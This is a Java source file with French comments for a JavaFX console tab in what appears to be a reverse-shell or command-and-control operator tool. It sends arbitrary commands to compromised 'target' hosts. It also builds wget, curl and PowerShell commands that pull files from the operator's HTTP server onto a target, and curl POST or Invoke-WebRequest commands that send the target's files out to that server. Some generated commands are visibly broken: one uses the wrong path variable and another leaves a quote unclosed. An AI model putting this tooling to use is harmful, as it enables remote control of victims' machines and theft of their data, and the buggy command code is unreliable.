import javafx.application.Platform;
import javafx.scene.control.Tab;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.input.KeyCode;
import javafx.scene.layout.Priority;
import javafx.scene.layout.VBox;
import javafx.stage.FileChooser;
import javafx.stage.Stage;
import javafx.scene.control.ComboBox;
import javafx.scene.control.Label;
import javafx.scene.control.Button;
import javafx.scene.Scene;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.collections.FXCollections;
import javafx.stage.Modality;
import javafx.scene.control.ListCell;
import javafx.stage.DirectoryChooser;
import javafx.scene.layout.HBox;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;

public class ConsoleTab extends Tab {
    private final ShellSession session;
    private final TextArea consoleOutput;
    private final TextField commandInput;
    private final Main mainApp;
    private int historyPosition = -1;
    private boolean awaitingResponse = false;
    private final List<String> responseBuffer = new ArrayList<>();
    private static final String COMMAND_SEPARATOR = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
    private static final String RESULT_SEPARATOR = "────────────────────────────────────────────";
    private static final String HELP_MESSAGE = 
            "Available commands:\n" +
            "----------Only Server Side Commands----------\n" +
            "- help             : Display this help message\n" +
            "- upload           : Upload a file to the target system\n" +
            "- download         : Download a file using HTTP server\n" +
            "- clear            : Clear the console\n" +
            "- exit/quit        : Close the connection\n" +
            "Any other input will be executed as a command on the target system.";
    
    // Dracula theme colors
    private static final String DRACULA_BACKGROUND = "#282a36";
    private static final String DRACULA_CURRENT_LINE = "#44475a";
    private static final String DRACULA_FOREGROUND = "#f8f8f2";
    private static final String DRACULA_COMMENT = "#6272a4";
    private static final String DRACULA_CYAN = "#8be9fd";
    private static final String DRACULA_GREEN = "#50fa7b";
    private static final String DRACULA_ORANGE = "#ffb86c";
    private static final String DRACULA_PINK = "#ff79c6";
    private static final String DRACULA_PURPLE = "#bd93f9";
    private static final String DRACULA_RED = "#ff5555";
    private static final String DRACULA_YELLOW = "#f1fa8c";

    // Commandes locales (traitées uniquement côté serveur)
    private static final List<String> LOCAL_COMMANDS = List.of("help", "upload", "download", "clear", "exit", "quit");

    public ConsoleTab(ShellSession session, Main mainApp) {
        super(); // Appel au constructeur parent Tab
        
        this.session = session;
        this.mainApp = mainApp;
        this.consoleOutput = new TextArea();
        this.commandInput = new TextField();
        
        // Définir le texte de l'onglet
        setText(session.getIp() + " (" + session.getHostname() + ")");
        
        // Vérifier que les flux sont disponibles
        if (session.getIn() == null || session.getOut() == null) {
            System.err.println("[ERREUR] Les flux d'entrée/sortie sont null pour la session: " + session.getIp());
        }
        
        // Initialisation de l'interface
        initialize();
        
        // Afficher un message de bienvenue et l'état de la connexion
        Platform.runLater(() -> {
            appendToConsole("[+] Connected to " + session.getIp() + " (" + session.getHostname() + ")", DRACULA_GREEN);
            appendToConsole("[+] Session type: " + session.getPayloadType(), DRACULA_GREEN);
            appendToConsole("[+] OS: " + session.getOs(), DRACULA_GREEN);
            appendToConsole("[+] Use 'help' to see available commands", DRACULA_CYAN);
            appendSeparator(COMMAND_SEPARATOR, DRACULA_PURPLE);

        });
    }

    private void initialize() {
        consoleOutput.setEditable(false);
        consoleOutput.setWrapText(true);
        
        // Appliquer le style Dracula
        consoleOutput.setStyle(
            "-fx-font-family: 'Monospace';" +
            "-fx-font-size: 12px;" +
            "-fx-text-fill: " + DRACULA_FOREGROUND + ";" +
            "-fx-control-inner-background: " + DRACULA_BACKGROUND + ";" +
            "-fx-highlight-fill: " + DRACULA_PURPLE + ";" +
            "-fx-highlight-text-fill: " + DRACULA_FOREGROUND + ";" +
            "-fx-padding: 10px;"
        );
        
        // Style pour le champ de saisie des commandes
        commandInput.setStyle(
            "-fx-font-family: 'Monospace';" +
            "-fx-font-size: 12px;" +
            "-fx-text-fill: " + DRACULA_FOREGROUND + ";" +
            "-fx-control-inner-background: " + DRACULA_BACKGROUND + ";" +
            "-fx-highlight-fill: " + DRACULA_PURPLE + ";" +
            "-fx-highlight-text-fill: " + DRACULA_FOREGROUND + ";" +
            "-fx-prompt-text-fill: " + DRACULA_COMMENT + ";"
        );
        
        commandInput.setPromptText("Enter command...");

        commandInput.setOnKeyPressed(event -> {
            if (event.getCode() == KeyCode.ENTER) {
                String command = commandInput.getText().trim();
                if (!command.isEmpty()) {
                commandInput.clear();
                handleCommand(command);
                }
            } else if (event.getCode() == KeyCode.UP) {
                showPreviousCommand();
            } else if (event.getCode() == KeyCode.DOWN) {
                showNextCommand();
            }
        });

        VBox.setVgrow(consoleOutput, Priority.ALWAYS);
        VBox layout = new VBox(5, consoleOutput, commandInput);
        layout.setStyle("-fx-background-color: " + DRACULA_BACKGROUND + ";");
        setContent(layout);
        
        // Démarrer l'écouteur de réponses
        startResponseListener();
    }

    /**
     * Envoie une commande au client via le socket
     * @param command La commande à envoyer
     */
    public void sendCommand(String command) {
        try {
            // Afficher la commande dans la console
            appendSeparator(COMMAND_SEPARATOR, DRACULA_PURPLE);
            appendToConsole("[>] " + command, DRACULA_GREEN);
            
            // Ajouter à l'historique
            session.addToHistory(command);
            
            // Vider tout tampon de réponse en attente
            responseBuffer.clear();
            awaitingResponse = true;
            
            // ENVOYER LA COMMANDE PAR LE SOCKET
            PrintWriter out = session.getOut();
            if (out != null) {
                out.println(command);
                out.flush(); // TRÈS IMPORTANT: s'assurer que la commande est envoyée immédiatement
                
                // Log de débogage
                System.out.println("[DEBUG] Commande envoyée: " + command);
        } else {
                appendToConsole("[!] Error: Output stream is null", DRACULA_RED);
            }
        } catch (Exception e) {
            session.setStatus("Offline");
            appendToConsole("[!] Error sending command: " + e.getMessage(), DRACULA_RED);
            commandInput.setDisable(true);
            commandInput.setPromptText("Connection lost");
        }
    }

    /**
     * Gère une commande entrée par l'utilisateur
     * @param command La commande à traiter
     */
    private void handleCommand(String command) {
        if (command == null || command.trim().isEmpty()) {
            return;
        }
        
        // Traiter les commandes locales spéciales
        if (command.equalsIgnoreCase("help")) {
            displayHelp();
        } else if (command.equalsIgnoreCase("clear")) {
            clearConsole();
        } else if (command.equalsIgnoreCase("exit") || command.equalsIgnoreCase("quit")) {
            closeSession();
        } else if (command.equalsIgnoreCase("upload")) {
            showUploadWindow();
        } else if (command.equalsIgnoreCase("download")) {
            showDownloadWindow();
        } else {
            // Envoyer toute autre commande au client
            sendCommand(command);
        }
    }
    
    private void startResponseListener() {
        Thread responseThread = new Thread(() -> {
            try {
                BufferedReader in = session.getIn();
                if (in == null) {
                    appendToConsole("[!] Error: Input stream is null", DRACULA_RED);
                    return;
                }
                
                String line;
                System.out.println("[DEBUG] Démarrage de l'écouteur de réponses");
                
                while ((line = in.readLine()) != null) {
                    System.out.println("[DEBUG] Réponse reçue: " + line);
                    
                    // Ignorer les messages de contrôle spécifiques
                    if (line.equals("METADATA") || line.trim().isEmpty()) {
                        continue;
                    }
                    
                    // Gérer les terminateurs de réponse
                    if (line.equals("--END--")) {
                        if (!responseBuffer.isEmpty()) {
                            final List<String> responses = new ArrayList<>(responseBuffer);
                            responseBuffer.clear();
                            Platform.runLater(() -> {
                                for (String response : responses) {
                                    appendToConsole(response, DRACULA_CYAN);
                                }
                                appendSeparator(RESULT_SEPARATOR, DRACULA_COMMENT);
                                awaitingResponse = false;
                            });
                        }
                        continue;
                    }
                    
                    // Ignorer les lignes de métadonnées pendant l'attente d'une réponse
                    if (line.contains("|") && awaitingResponse) {
                        continue;
                    }
                    
                    // Traiter la réponse
                    final String response = line;
                    if (awaitingResponse) {
                        responseBuffer.add(response);
                    } else {
                        Platform.runLater(() -> appendToConsole(response, DRACULA_CYAN));
                    }
                }
                
                System.out.println("[DEBUG] Fin de la boucle de lecture - socket fermé ou flux terminé");
                
            } catch (IOException e) {
                e.printStackTrace();
                if (!session.getClientSocket().isClosed()) {
                    Platform.runLater(() -> {
                        session.setStatus("Offline");
                        appendToConsole("[!] Connection lost: " + e.getMessage(), DRACULA_RED);
                        commandInput.setDisable(true);
                        commandInput.setPromptText("Connection lost");
                    });
                }
            }
        });
        
        responseThread.setDaemon(true);
        responseThread.start();
        
    }

    public boolean isSocketActive() {
        Socket socket = session.getClientSocket();
        return socket != null && !socket.isClosed() && socket.isConnected();
    }

    /**
     * Affiche le message d'aide
     */
    private void displayHelp() {
        appendSeparator(COMMAND_SEPARATOR, DRACULA_PURPLE);
        appendToConsole("[>] help", DRACULA_GREEN);
        appendToConsole(HELP_MESSAGE, DRACULA_CYAN);
        appendSeparator(RESULT_SEPARATOR, DRACULA_COMMENT);
    }
    
    /**
     * Efface le contenu de la console
     */
    private void clearConsole() {
        Platform.runLater(() -> consoleOutput.clear());
    }
    
    /**
     * Ferme la session
     */
    private void closeSession() {
        appendToConsole("[!] Closing connection to " + session.getIp(), DRACULA_RED);
        session.close();
        commandInput.setDisable(true);
        commandInput.setPromptText("Connection closed");
    }

    private void showUploadWindow() {
        Stage stageUpload = new Stage();
        stageUpload.initModality(Modality.APPLICATION_MODAL);
        stageUpload.setTitle("Upload File");
        
        stageUpload.setMinWidth(400);
        stageUpload.setMinHeight(250);

        Label serverLabel = new Label("Select Upload Server");
        serverLabel.setStyle("-fx-text-fill: #8be9fd; -fx-font-weight: bold;");

        // Créer une liste de tous les serveurs disponibles
        ComboBox<Main.ServerEntry> serverComboBox = new ComboBox<>();
        serverComboBox.setItems(FXCollections.observableArrayList(
            mainApp.getServerList()
        ));
        
        // Améliorer l'affichage des serveurs
        serverComboBox.setCellFactory(param -> new ListCell<Main.ServerEntry>() {
            @Override
            protected void updateItem(Main.ServerEntry item, boolean empty) {
                super.updateItem(item, empty);
                if (empty || item == null) {
                    setText(null);
                } else {
                    setText(item.getIp() + ":" + item.getPort() + " (" + item.getType() + ")");
                }
            }
        });
        
        serverComboBox.setButtonCell(new ListCell<Main.ServerEntry>() {
            @Override
            protected void updateItem(Main.ServerEntry item, boolean empty) {
                super.updateItem(item, empty);
                if (empty || item == null) {
                    setText(null);
                } else {
                    setText(item.getIp() + ":" + item.getPort() + " (" + item.getType() + ")");
                }
            }
        });
        
        serverComboBox.setPrefWidth(300);

        Button chooseFileButton = new Button("Choose File");
        chooseFileButton.setStyle("-fx-background-color: #6272a4; -fx-text-fill: #f8f8f2;");
        chooseFileButton.setOnAction(e -> {
            Main.ServerEntry selectedServer = serverComboBox.getSelectionModel().getSelectedItem();
            if (selectedServer != null) {
                FileChooser fileChooser = new FileChooser();
                fileChooser.setTitle("Select File to Upload");
                
                // Tenter d'utiliser le répertoire du serveur comme point de départ
                try {
                    File initialDir = new File(selectedServer.getFileLocation());
                    if (initialDir.exists() && initialDir.isDirectory()) {
                        fileChooser.setInitialDirectory(initialDir);
                    }
                } catch (Exception ex) {
                    // Ignorer les erreurs d'accès au répertoire
                }
                
                File selectedFile = fileChooser.showOpenDialog(stageUpload);
                if (selectedFile != null) {
                    uploadFile(selectedServer, selectedFile);
                    stageUpload.close();
                }
            } else {
                appendToConsole("[-] Please select a server first", DRACULA_RED);
            }
        });

        VBox layout = new VBox(15, serverLabel, serverComboBox, chooseFileButton);
        layout.setPadding(new Insets(25));
        layout.setAlignment(Pos.CENTER);
        layout.setStyle("-fx-background-color: #282a36;");

        Scene sceneUpload = new Scene(layout, 400, 250);
        stageUpload.setScene(sceneUpload);
        stageUpload.showAndWait();
    }

    private void uploadFile(Main.ServerEntry server, File file) {
        String os = session.getOs() != null ? session.getOs().toLowerCase() : "";
        String fileName = file.getName();
        
        // Afficher des informations sur le transfert
        appendToConsole("[+] Uploading file: " + fileName, DRACULA_GREEN);
        appendToConsole("[+] File size: " + formatFileSize(file.length()), DRACULA_GREEN);
        appendToConsole("[+] Target OS: " + os, DRACULA_GREEN);
        appendToConsole("[+] Using server: " + server.getIp() + ":" + server.getPort(), DRACULA_GREEN);
        
        // Vérifier que le fichier existe sur le serveur avant de lancer la commande de téléchargement
        String serverFilePath = server.getFileLocation();
        if (!serverFilePath.endsWith(File.separator)) {
            serverFilePath += File.separator;
        }
        
        try {
            // Copier le fichier dans le répertoire du serveur
            File targetDir = new File(serverFilePath);
            if (!targetDir.exists() || !targetDir.isDirectory()) {
                appendToConsole("[-] Server directory does not exist: " + serverFilePath, DRACULA_RED);
                return;
            }
            
            // Copier le fichier sélectionné vers le répertoire du serveur
            File targetFile = new File(targetDir, fileName);
            try {
                java.nio.file.Files.copy(
                    file.toPath(), 
                    targetFile.toPath(),
                    java.nio.file.StandardCopyOption.REPLACE_EXISTING
                );
                appendToConsole("[+] File copied to server directory", DRACULA_GREEN);
            } catch (IOException e) {
                appendToConsole("[-] Failed to copy file to server directory: " + e.getMessage(), DRACULA_RED);
                // Si le fichier est déjà dans le répertoire, on peut continuer
                if (!targetFile.exists()) {
                    return;
                }
            }
            
            // Encoder le nom de fichier pour l'URL
            String encodedFileName = "";
            try {
                encodedFileName = java.net.URLEncoder.encode(fileName, "UTF-8")
                                  .replace("+", "%20");  // Les espaces sont encodés en + par URLEncoder, les remplacer par %20
            } catch (Exception e) {
                // Fallback si l'encodage échoue
                encodedFileName = fileName.replace(" ", "%20");
            }
            
            // Construire la commande de téléchargement appropriée selon l'OS
            String downloadUrl = "http://" + server.getIp() + ":" + server.getPort() + "/" + encodedFileName;
            String command;
            
            if (os.contains("linux") || os.contains("unix") || os.contains("darwin") || os.contains("mac")) {
                // Pour Linux/Unix/macOS
                appendToConsole("[+] Using Linux/Unix download command", DRACULA_CYAN);
                
                // Échapper les caractères spéciaux dans le nom de fichier pour le shell
                String escapedFileName = fileName.replace("\"", "\\\"").replace("'", "\\'");
                
                // Commande pour Linux avec gestion d'erreurs et d'espaces
                command = "if command -v wget > /dev/null; then " +
                          "wget \"" + downloadUrl + "\" -O \"" + escapedFileName + "\"; " +
                          "elif command -v curl > /dev/null; then " +
                          "curl -o \"" + escapedFileName + "\" \"" + downloadUrl + "\"; " +
                          "else echo 'Neither wget nor curl is available'; " +
                          "fi";
            } else if (os.contains("windows")) {
                // Pour Windows
                appendToConsole("[+] Using Windows download command with wget", DRACULA_CYAN);
                
                // Simplement utiliser wget comme demandé, avec les guillemets pour gérer les espaces
                command = "powershell wget \"" + downloadUrl + "\" -O \"" + fileName + "\"";
            } else {
                // Système inconnu, essayer une commande universelle
                appendToConsole("[+] Unknown OS, trying wget command", DRACULA_CYAN);
                command = "wget \"" + downloadUrl;
            }
            
            // Envoyer la commande au client
            sendCommand(command);
            
        } catch (Exception e) {
            appendToConsole("[-] Error preparing upload: " + e.getMessage(), DRACULA_RED);
        }
    }

    // Méthode utilitaire pour formater la taille d'un fichier
    private String formatFileSize(long size) {
        if (size < 1024) {
            return size + " B";
        } else if (size < 1024 * 1024) {
            return String.format("%.2f KB", size / 1024.0);
        } else if (size < 1024 * 1024 * 1024) {
            return String.format("%.2f MB", size / (1024.0 * 1024.0));
        } else {
            return String.format("%.2f GB", size / (1024.0 * 1024.0 * 1024.0));
        }
    }

    // Méthodes d'affichage de la console
    public void appendToConsole(String text) {
        appendToConsole(text, DRACULA_FOREGROUND);
    }
    
    public void appendToConsole(String text, String color) {
        Platform.runLater(() -> {
        // Sauvegarder le style actuel
        String currentStyle = consoleOutput.getStyle();
        // Appliquer temporairement un style avec la couleur spécifiée
        consoleOutput.setStyle(currentStyle + "-fx-text-fill: " + color + ";");
        consoleOutput.appendText(text + "\n");
        // Restaurer le style d'origine
        consoleOutput.setStyle(currentStyle);
        // Scroll to bottom
        consoleOutput.positionCaret(consoleOutput.getText().length());
        });
    }
    
    private void appendSeparator(String separator) {
        appendSeparator(separator, DRACULA_COMMENT);
    }
    
    private void appendSeparator(String separator, String color) {
        Platform.runLater(() -> {
        // Sauvegarder le style actuel
        String currentStyle = consoleOutput.getStyle();
        // Appliquer temporairement un style avec la couleur spécifiée
        consoleOutput.setStyle(currentStyle + "-fx-text-fill: " + color + ";");
        consoleOutput.appendText(separator + "\n");
        // Restaurer le style d'origine
        consoleOutput.setStyle(currentStyle);
        consoleOutput.positionCaret(consoleOutput.getText().length());
        });
    }
    
    private void showPreviousCommand() {
        if (session.getCommandHistory().isEmpty()) return;
        
        if (historyPosition == -1) {
            historyPosition = session.getCommandHistory().size() - 1;
        } else if (historyPosition > 0) {
            historyPosition--;
        }
        
        if (historyPosition >= 0 && historyPosition < session.getCommandHistory().size()) {
            commandInput.setText(session.getCommandHistory().get(historyPosition));
            commandInput.selectAll();
            commandInput.positionCaret(commandInput.getText().length());
        }
    }
    
    private void showNextCommand() {
        if (historyPosition == -1 || session.getCommandHistory().isEmpty()) return;
        
        if (historyPosition < session.getCommandHistory().size() - 1) {
            historyPosition++;
            commandInput.setText(session.getCommandHistory().get(historyPosition));
        } else {
            historyPosition = -1;
            commandInput.clear();
        }
        
        commandInput.positionCaret(commandInput.getText().length());
    }
    
    public ShellSession getSession() {
        return session;
    }

    private void showDownloadWindow() {
        Stage stageDownload = new Stage();
        stageDownload.initModality(Modality.APPLICATION_MODAL);
        stageDownload.setTitle("Download File");
        
        // Définir une taille minimale pour la fenêtre
        stageDownload.setMinWidth(500);
        stageDownload.setMinHeight(350);
        
        Label serverLabel = new Label("Select HTTP Server");
        serverLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
        
        // Afficher tous les serveurs HTTP
        ComboBox<Main.ServerEntry> serverComboBox = new ComboBox<>();
        serverComboBox.setItems(mainApp.getServerList());
        serverComboBox.setPrefWidth(300);
        
        // Améliorer l'affichage des serveurs dans la ComboBox
        serverComboBox.setCellFactory(param -> new ListCell<Main.ServerEntry>() {
            @Override
            protected void updateItem(Main.ServerEntry item, boolean empty) {
                super.updateItem(item, empty);
                if (empty || item == null) {
                    setText(null);
                } else {
                    setText(item.getIp() + ":" + item.getPort() + " - " + item.getFileLocation());
                }
            }
        });
        
        serverComboBox.setButtonCell(new ListCell<Main.ServerEntry>() {
            @Override
            protected void updateItem(Main.ServerEntry item, boolean empty) {
                super.updateItem(item, empty);
                if (empty || item == null) {
                    setText(null);
                } else {
                    setText(item.getIp() + ":" + item.getPort() + " - " + item.getFileLocation());
                }
            }
        });
        
        Label fileLabel = new Label("Remote File Path");
        fileLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
        
        TextField filePathField = new TextField();
        filePathField.setPromptText("Enter the path of the file on the remote system");
        filePathField.setPrefWidth(300);
        applyDraculaTextStyle(filePathField);
        
        Label saveLabel = new Label("Local Save Location");
        saveLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
        
        TextField saveLocationField = new TextField();
        saveLocationField.setPromptText("Select where to save the file locally");
        saveLocationField.setPrefWidth(300);
        applyDraculaTextStyle(saveLocationField);
        
        Button chooseSaveLocationButton = new Button("Browse");
        applyDraculaButtonStyle(chooseSaveLocationButton);
        
        chooseSaveLocationButton.setOnAction(e -> {
            FileChooser fileChooser = new FileChooser();
            fileChooser.setTitle("Save File As");
            
            // Récupérer le serveur sélectionné pour le répertoire initial
            Main.ServerEntry selectedServer = serverComboBox.getSelectionModel().getSelectedItem();
            
            // Extraire le nom du fichier du chemin distant
            String fileName = "";
            String remoteFile = filePathField.getText().trim();
            if (!remoteFile.isEmpty()) {
                fileName = new File(remoteFile).getName();
            }
            
            // Définir le répertoire initial comme celui du serveur HTTP
            if (selectedServer != null) {
                File initialDirectory = new File(selectedServer.getFileLocation());
                if (initialDirectory.exists() && initialDirectory.isDirectory()) {
                    fileChooser.setInitialDirectory(initialDirectory);
                    
                    // Si on a un nom de fichier, le définir comme nom initial
                    if (!fileName.isEmpty()) {
                        fileChooser.setInitialFileName(fileName);
                    }
                }
            }
            
            // Configurer les filtres pour tous les fichiers
            fileChooser.getExtensionFilters().addAll(
                new FileChooser.ExtensionFilter("All Files", "*.*")
            );
            
            File selectedFile = fileChooser.showSaveDialog(stageDownload);
            if (selectedFile != null) {
                saveLocationField.setText(selectedFile.getAbsolutePath());
            }
        });
        
        Button downloadButton = new Button("Download");
        applyDraculaButtonStyle(downloadButton);
        downloadButton.setOnAction(e -> {
            Main.ServerEntry selectedServer = serverComboBox.getSelectionModel().getSelectedItem();
            String remotePath = filePathField.getText().trim();
            String localPath = saveLocationField.getText().trim();
            
            if (selectedServer != null && !remotePath.isEmpty() && !localPath.isEmpty()) {
                String command;
                String os = session.getOs().toLowerCase();
                
                if (os.contains("win")) {
                    // Extraire juste le nom du fichier du chemin distant
                    String fileName = new File(remotePath).getName();
                    command = String.format(
                        "powershell Invoke-WebRequest -Uri \"http://%s:%d/%s\" -Method POST -InFile \"%s\" -ContentType \"application/octet-stream\"",
                        selectedServer.getIp(),
                        selectedServer.getPort(),
                        fileName,
                        remotePath
                    );
                } else {
                    // Pour Linux/Unix, utiliser wget ou curl
                    command = String.format("curl -X POST -F file=@%s http://%s:%s",
                    localPath, selectedServer.getIp(), selectedServer.getPort());
                }
                
                sendCommand(command);
                stageDownload.close();
            }
        });
        
        // Créer un HBox pour le champ de sauvegarde et le bouton Browse
        HBox saveLocationBox = new HBox(10);
        saveLocationBox.getChildren().addAll(saveLocationField, chooseSaveLocationButton);
        
        VBox layout = new VBox(15);
        layout.setPadding(new Insets(20));
        layout.getChildren().addAll(
            serverLabel, 
            serverComboBox,
            fileLabel, 
            filePathField,
            saveLabel,
            saveLocationBox,
            downloadButton
        );
        layout.setStyle("-fx-background-color: " + DRACULA_BACKGROUND + ";");
        
        Scene scene = new Scene(layout);
        stageDownload.setScene(scene);
        stageDownload.showAndWait();
    }

    private void applyDraculaButtonStyle(Button button) {
        button.setStyle(
            "-fx-background-color: " + DRACULA_PURPLE + ";" +
            "-fx-text-fill: " + DRACULA_FOREGROUND + ";" +
            "-fx-font-weight: bold;" +
            "-fx-padding: 8px 16px;" +
            "-fx-cursor: hand;"
        );
    }

    private void applyDraculaTextStyle(TextField textField) {
        textField.setStyle(
            "-fx-font-family: 'Monospace';" +
            "-fx-font-size: 12px;" +
            "-fx-text-fill: " + DRACULA_FOREGROUND + ";" +
            "-fx-control-inner-background: " + DRACULA_BACKGROUND + ";" +
            "-fx-highlight-fill: " + DRACULA_PURPLE + ";" +
            "-fx-highlight-text-fill: " + DRACULA_FOREGROUND + ";" +
            "-fx-prompt-text-fill: " + DRACULA_COMMENT + ";"
        );
    }
}